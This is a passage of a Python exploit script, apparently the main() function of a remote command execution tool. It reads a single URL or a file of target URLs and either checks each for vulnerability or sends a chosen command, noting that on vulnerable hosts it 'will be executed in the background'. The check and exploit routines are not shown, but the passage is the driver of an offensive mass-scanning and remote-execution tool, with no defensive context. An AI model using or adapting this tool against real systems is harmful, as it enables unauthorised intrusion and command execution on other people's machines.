def main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):
    if url:
        if not do_exploit:
            result = check(url)
            output = '[*] Status: '
            if result is True:
                output += 'Vulnerable!'
            else:
                output += 'Not Affected.'
            print(output)
        else:
            exploit(url, cmd)
            print("[$] Request sent.")
            print("[.] If the host is vulnerable, the command will be executed in the background.")

    if usedlist:
        URLs_List = []
        try:
            f_file = open(str(usedlist), 'r')
            URLs_List = f_file.read().replace('\r', '').split('\n')
            try:
                URLs_List.remove('')
            except ValueError:
                pass
            f_file.close()
        except Exception as e:
            print('Error: There was an error in reading list file.')
            print("Exception: " + str(e))
            exit(1)
        for url in URLs_List:
            if not do_exploit:
                result = check(url)
                output = '[*] Status: '
                if result is True:
                    output += 'Vulnerable!'
                else:
                    output += 'Not Affected.'
                print(output)
            else:
                exploit(url, cmd)
                print("[$] Request sent.")
                print("[.] If the host is vulnerable, the command will be executed in the background.")
